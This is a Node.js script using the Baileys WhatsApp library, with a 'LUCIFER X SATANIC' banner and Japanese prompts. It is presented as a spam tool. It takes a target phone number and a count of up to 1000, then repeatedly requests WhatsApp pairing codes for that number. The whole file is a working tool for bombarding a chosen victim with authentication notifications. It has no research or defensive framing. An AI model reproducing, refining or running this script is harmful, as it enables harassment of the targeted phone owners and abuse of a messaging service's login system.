const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");

const colors = {
    reset: '\x1b[0m',
    red: '\x1b[31m',
    darkRed: '\x1b[31;1m',
    black: '\x1b[30m',
    white: '\x1b[37m',
    darkGray: '\x1b[90m',
    bgBlack: '\x1b[40m',
    bgRed: '\x1b[41m',
    bold: '\x1b[1m',
};

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

function question(text) {
    return new Promise(resolve => rl.question(text, resolve));
}

function printHeader() {
    console.clear();
    console.log(colors.bgBlack + colors.red + colors.bold);
    console.log("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓");
    console.log("┃                                            ┃");
    console.log("┃    ＬＵＣＩＦＥＲ　Ｘ　ＳＡＴＡＮＩＣ    ┃");
    console.log("┃       スパムペアリングコードツール         ┃");
    console.log("┃                                            ┃");
    console.log("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛");
    console.log(colors.reset);
}

async function spamPairing() {
    const { state } = await useMultiFileAuthState('./69/session');
    const luciferBot = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["HAZEL X SATANIC", "Chrome", "20.0.04"],
    });

    try {
        const phoneNumber = await question(colors.red + "対象番号 (+62で始まる): " + colors.reset);

        let totalSpamRaw = await question(colors.red + "スパム回数 (1〜1000): " + colors.reset);
        const totalSpam = parseInt(totalSpamRaw);

        if (isNaN(totalSpam) || totalSpam <= 0 || totalSpam > 1000) {
            console.log(colors.red + "無効な入力です。例: 20" + colors.reset);
            return;
        }

        for (let i = 0; i < totalSpam; i++) {
            try {
                let code = await luciferBot.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(colors.darkRed + `成功！ペアリングコード送信中: ${phoneNumber} [${i + 1}/${totalSpam}]` + colors.reset);
            } catch (err) {
                console.error(colors.red + 'エラー: ' + err.message + colors.reset);
            }
        }
    } catch (err) {
        console.error(colors.red + "エラーが発生しました。" + colors.reset);
    }
}

async function mainMenu() {
    printHeader();

    console.log(colors.red + "メニュー:");
    console.log("  1. スパムペアリングコードを開始する");
    console.log("  2. 終了する" + colors.reset);

    const choice = await question(colors.red + "選択してください (1/2): " + colors.reset);

    if (choice === '1') {
        await spamPairing();
        await new Promise(r => setTimeout(r, 2000));
        await mainMenu();
    } else if (choice === '2') {
        console.log(colors.red + "ご利用ありがとうございました。さようなら。" + colors.reset);
        rl.close();
        process.exit(0);
    } else {
        console.log(colors.red + "無効な選択です。もう一度試してください。" + colors.reset);
        await new Promise(r => setTimeout(r, 2000));
        await mainMenu();
    }
}

mainMenu();
